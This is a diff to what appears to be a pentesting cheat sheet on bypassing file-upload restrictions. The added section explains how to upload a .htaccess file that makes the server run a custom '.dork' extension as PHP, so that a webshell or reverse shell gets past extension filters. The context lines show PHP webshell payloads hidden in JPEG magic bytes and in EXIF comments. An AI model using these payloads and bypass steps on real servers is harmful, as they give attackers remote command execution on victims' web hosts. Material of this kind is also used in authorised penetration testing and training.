@@ -15,6 +15,7 @@
 * [Bypass the extension checks](#bypass-the-entension-checks)
 * [Bypass using the content-type](#bypass-using-the-content-type)
 * [Magic number](#magic-number)
+* [Bypass using .htaccess](#bypass-using-.htaccess)
 
 
 ##### ➤ Shell Stabilisation
@@ -271,7 +272,17 @@ printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
 ```
 
+## 🔻Bypass using .htaccess
 
+```
+➤ 1. Create a new .htaccess file
+echo "AddType application/x-httpd-php .dork" > .htaccess
+
+➤ 2. Upload the .htaccess file in the victim web folder
+
+➤ 3. Upload your php webshell or reverse shell with .dork rather than .php
+ex: php-backdoor.dork
+```
 
 # 
 # ⭕ Shell Stabilisation
